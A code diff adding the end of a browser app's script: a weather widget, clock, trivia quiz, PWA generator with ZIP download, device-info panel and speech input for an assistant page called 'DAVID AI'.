+    fetch(`https://api.open-meteo.com/v1/forecast?latitude=${pos.coords.latitude}&longitude=${pos.coords.longitude}&current_weather=true`)
+    .then(r=>r.json()).then(d=>{
+      const t=d.current_weather.temperature,c=d.current_weather.weathercode;
+      document.getElementById('w-temp').textContent=t+'°C';
+      document.getElementById('w-icon').textContent=getWeatherIcon(c);
+      document.getElementById('w-desc').textContent=getWeatherDesc(c);
+      document.getElementById('w-city').textContent='Your Location';
+    }).catch(()=>{document.getElementById('w-temp').textContent='N/A';document.getElementById('w-desc').textContent='Check your connection';});
+  },()=>{document.getElementById('w-city').textContent='Location access denied';});
+}
+function getWeatherIcon(c){return c===0?'☀️':c<=3?'⛅':c<=48?'🌫️':c<=67?'🌧️':c<=77?'❄️':c<=82?'🌦️':'⛈️';}
+function getWeatherDesc(c){return c===0?'Clear Sky':c<=3?'Partly Cloudy':c<=48?'Foggy':c<=67?'Rainy':c<=77?'Snowy':c<=82?'Showers':'Thunderstorm';}
+function startClock(){
+  if(clockInterval)clearInterval(clockInterval);
+  document.getElementById('live-time').textContent=new Date().toLocaleTimeString();
+  clockInterval=setInterval(()=>{document.getElementById('live-time').textContent=new Date().toLocaleTimeString();},1000);
+}
+
+// ======================================================
+// GAME
+// ======================================================
+const QS=[
+  {q:"Capital of France?",a:"Paris",opts:["Paris","London","Berlin","Rome"]},
+  {q:"Sides of a hexagon?",a:"6",opts:["5","6","7","8"]},
+  {q:"Planet closest to the Sun?",a:"Mercury",opts:["Venus","Earth","Mercury","Mars"]},
+  {q:"Who wrote Romeo and Juliet?",a:"Shakespeare",opts:["Dickens","Shakespeare","Tolstoy","Hemingway"]},
+  {q:"Chemical formula for water?",a:"H₂O",opts:["H₂O","CO₂","NaCl","O₂"]},
+  {q:"12 × 12 = ?",a:"144",opts:["144","122","132","154"]},
+  {q:"Largest ocean on Earth?",a:"Pacific",opts:["Atlantic","Indian","Pacific","Arctic"]},
+  {q:"WWII ended in which year?",a:"1945",opts:["1943","1944","1945","1946"]},
+  {q:"Chemical symbol Au stands for?",a:"Gold",opts:["Silver","Gold","Aluminium","Argon"]},
+  {q:"Bones in the adult human body?",a:"206",opts:["196","206","216","226"]},
+  {q:"Speed of light (approx)?",a:"300,000 km/s",opts:["150,000 km/s","300,000 km/s","500,000 km/s","1M km/s"]},
+  {q:"Who painted the Mona Lisa?",a:"Da Vinci",opts:["Michelangelo","Raphael","Da Vinci","Picasso"]},
+  {q:"Smallest prime number?",a:"2",opts:["0","1","2","3"]},
+  {q:"Most native speakers worldwide?",a:"Mandarin",opts:["English","Spanish","Mandarin","Hindi"]},
+  {q:"Plants absorb which gas?",a:"CO₂",opts:["Oxygen","Nitrogen","CO₂","Hydrogen"]},
+  {q:"Largest planet in solar system?",a:"Jupiter",opts:["Saturn","Jupiter","Neptune","Uranus"]},
+  {q:"√144 = ?",a:"12",opts:["11","12","13","14"]},
+  {q:"How many continents?",a:"7",opts:["5","6","7","8"]},
+  {q:"Speed of sound in air (approx)?",a:"343 m/s",opts:["343 m/s","150 m/s","500 m/s","1000 m/s"]},
+  {q:"What is H₂SO₄?",a:"Sulphuric Acid",opts:["Sulphuric Acid","Salt Water","Hydrogen Peroxide","Vinegar"]},
+];
+let qIdx=Math.floor(Math.random()*QS.length);
+function initGame(){nextQuestion();}
+function nextQuestion(){
+  qIdx=(qIdx+1)%QS.length;
+  const q=QS[qIdx];currentAnswer=q.a;
+  document.getElementById('g-question').textContent=q.q;
+  const el=document.getElementById('g-options');el.innerHTML='';
+  [...q.opts].sort(()=>Math.random()-0.5).forEach(o=>{
+    const b=document.createElement('button');b.className='game-opt';b.textContent=o;
+    b.onclick=()=>checkAnswer(o,b);el.appendChild(b);
+  });
+  document.getElementById('g-score').textContent=`Score: ${gameScore} | Streak: ${gameStreak}`;
+}
+function checkAnswer(ans,btn){
+  document.querySelectorAll('.game-opt').forEach(b=>{b.onclick=null;if(b.textContent===currentAnswer)b.classList.add('correct');});
+  if(ans===currentAnswer){btn.classList.add('correct');gameScore++;gameStreak++;davidSpeak(`Correct! Well done ${USER.nick}!`);}
+  else{btn.classList.add('wrong');gameStreak=0;davidSpeak(`Not quite, ${USER.nick}. The answer was ${currentAnswer}.`);}
+  document.getElementById('g-score').textContent=`Score: ${gameScore} | Streak: ${gameStreak}`;
+  setTimeout(nextQuestion,1600);
+}
+
+// ======================================================
+// PWA GENERATOR
+// ======================================================
+function generatePWA(){
+  const name=document.getElementById('pwa-name').value||'My PWA App';
+  const short=document.getElementById('pwa-short').value||'PWA';
+  const color=document.getElementById('pwa-color').value||'#FFD600';
+  const desc=document.getElementById('pwa-desc').value||'A Progressive Web App';
+  const content=document.getElementById('pwa-content').value||'A powerful web application';
+  const id=short.replace(/\s/g,'-').toLowerCase();
+
+  const manifest=JSON.stringify({name,short_name:short,description:desc,start_url:'./index.html',display:'standalone',background_color:color,theme_color:color,icons:[{src:'icon-192.png',sizes:'192x192',type:'image/png'},{src:'icon-512.png',sizes:'512x512',type:'image/png'}]},null,2);
+
+  const sw=`// DAVID AI — Service Worker for "${name}"\nconst CACHE='${id}-v1';\nconst ASSETS=['./',  './index.html','./manifest.json'];\nself.addEventListener('install',e=>{e.waitUntil(caches.open(CACHE).then(c=>c.addAll(ASSETS)));});\nself.addEventListener('fetch',e=>{e.respondWith(caches.match(e.request).then(r=>r||fetch(e.request).catch(()=>caches.match('./index.html'))));});\nself.addEventListener('activate',e=>{e.waitUntil(caches.keys().then(k=>Promise.all(k.filter(n=>n!==CACHE).map(n=>caches.delete(n)))));});`;
+
+  const html=`<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width,initial-scale=1">\n<title>${name}</title>\n<link rel="manifest" href="manifest.json">\n<meta name="theme-color" content="${color}">\n<style>\n*{margin:0;padding:0;box-sizing:border-box;}\nbody{font-family:system-ui,sans-serif;background:#0a0a0a;color:#f0f0f0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center;}\nh1{font-size:2.2rem;color:${color};margin-bottom:12px;}\np{color:#999;max-width:500px;line-height:1.7;}\n.badge{margin-top:24px;padding:6px 16px;border:1px solid ${color};border-radius:20px;font-size:0.75rem;color:${color};font-family:monospace;}\n</style>\n</head>\n<body>\n<h1>⚡ ${name}</h1>\n<p>${desc}</p>\n<p style="margin-top:14px;font-size:0.88rem;">${content}</p>\n<div class="badge">Generated by DAVID AI — Mr X</div>\n<script>\nif('serviceWorker'in navigator){\n  navigator.serviceWorker.register('./sw.js').then(r=>console.log('SW:',r.scope)).catch(console.error);\n}\n<\/script>\n</body>\n</html>`;
+
+  pwaFiles={manifest,sw,html,name,short};
+  const out=document.getElementById('pwa-output');
+  out.textContent=`// ========== manifest.json ==========\n${manifest}\n\n// ========== sw.js (Service Worker) ==========\n${sw}\n\n// ========== index.html ==========\n${html}`;
+  out.style.display='block';
+  document.getElementById('pwa-dl-wrap').style.display='block';
+  addMsg('david',`✅ "${name}" PWA generated! Includes service worker for offline support, web manifest, and full HTML shell. Download the ZIP and deploy to any static host — Netlify, Vercel, GitHub Pages.`);
+  davidSpeak(`Your PWA "${name}" is ready, ${USER.nick}! Download it now.`);
+}
+async function downloadPWA(){
+  if(typeof JSZip==='undefined'){alert('JSZip not loaded. Please check your internet connection.');return;}
+  const zip=new JSZip();
+  zip.file('index.html',pwaFiles.html);
+  zip.file('manifest.json',pwaFiles.manifest);
+  zip.file('sw.js',pwaFiles.sw);
+  zip.file('README.txt',`DAVID AI Generated PWA: ${pwaFiles.name}\n\nDEPLOYMENT:\n1. Upload all files to any static web host\n2. Ensure sw.js is served from the root\n3. Access via HTTPS for full PWA functionality\n\nGenerated by DAVID AI — Created by Mr X.`);
+  const blob=await zip.generateAsync({type:'blob'});
+  const a=document.createElement('a');a.href=URL.createObjectURL(blob);
+  a.download=`${(pwaFiles.short||'pwa').replace(/\s/g,'-').toLowerCase()}-pwa.zip`;a.click();
+}
+
+// ======================================================
+// SYSTEM CONTROL
+// ======================================================
+async function sysCtrlAction(type){
+  const el=document.getElementById('sysctrl-result');
+  try{
+    if(type==='battery'){
+      if('getBattery'in navigator){const b=await navigator.getBattery();el.textContent=`🔋 Battery: ${Math.round(b.level*100)}% | Charging: ${b.charging?'Yes ⚡':'No'} | Time remaining: ${b.dischargingTime===Infinity?'N/A':Math.round(b.dischargingTime/60)+'min'}`;}
+      else el.textContent='Battery API not supported in this browser.';
+    }else if(type==='network'){
+      const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+      el.textContent=c?`📶 Type: ${c.effectiveType||'N/A'} | Downlink: ${c.downlink||'?'}Mbps | RTT: ${c.rtt||'?'}ms | Save Data: ${c.saveData?'On':'Off'}`:`📶 Online: ${navigator.onLine?'Yes':'No'}`;
+    }else if(type==='screen'){
+      el.textContent=`🖥️ ${screen.width}×${screen.height}px | Window: ${window.innerWidth}×${window.innerHeight}px | DPR: ${window.devicePixelRatio} | Colour Depth: ${screen.colorDepth}bit`;
+    }else if(type==='memory'){
+      const m=performance.memory;
+      el.textContent=m?`💾 JS Used: ${(m.usedJSHeapSize/1e6).toFixed(1)}MB | Total: ${(m.totalJSHeapSize/1e6).toFixed(1)}MB | Limit: ${(m.jsHeapSizeLimit/1e6).toFixed(1)}MB`:'Memory API not available in this browser.';
+    }else if(type==='clipboard'){
+      try{const text=await navigator.clipboard.readText();el.textContent=`📋 Clipboard: "${text.substring(0,80)}${text.length>80?'...':''}"`;} catch{el.textContent='📋 Clipboard requires user permission. Grant it from browser settings.';}
+    }else if(type==='fullscreen'){
+      if(!document.fullscreenElement)await document.documentElement.requestFullscreen();
+      else await document.exitFullscreen();
+      el.textContent=`⛶ Fullscreen: ${document.fullscreenElement?'Active — press Escape to exit':'Exited'}`;
+    }
+    addMsg('david',`System info retrieved, ${USER.nick}! Check the control panel.`);
+  }catch(e){el.textContent='⚠️ Error: '+e.message;}
+}
+
+// ======================================================
+// MIC
+// ======================================================
+function toggleMic(){
+  const btn=document.getElementById('mic-btn');
+  if(!('webkitSpeechRecognition'in window||'SpeechRecognition'in window)){addMsg('david',`Speech recognition isn't supported here, ${USER.nick}. Try Chrome or Edge!`);return;}
+  if(recognition){recognition.stop();recognition=null;btn.classList.remove('listening');return;}
+  const SR=window.SpeechRecognition||window.webkitSpeechRecognition;
+  recognition=new SR();recognition.lang='en-US';recognition.interimResults=false;
+  btn.classList.add('listening');
+  recognition.onresult=e=>{document.getElementById('chat-input').value=e.results[0][0].transcript;sendMessage();};
+  recognition.onend=()=>{btn.classList.remove('listening');recognition=null;};
+  recognition.onerror=()=>{btn.classList.remove('listening');recognition=null;};
+  recognition.start();
+}
+
+// ======================================================
+// LAYOUT
+// ======================================================
+function switchLayout(mode){
+  const main=document.getElementById('ai-main');
+  if(mode==='mobile'){main.style.maxWidth='420px';main.style.margin='0 auto';document.getElementById('btn-mobile').classList.add('active');document.getElementById('btn-desktop').classList.remove('active');}
+  else{main.style.maxWidth='';main.style.margin='';document.getElementById('btn-desktop').classList.add('active');document.getElementById('btn-mobile').classList.remove('active');}
+}
+</script>
+</body>
+</html>
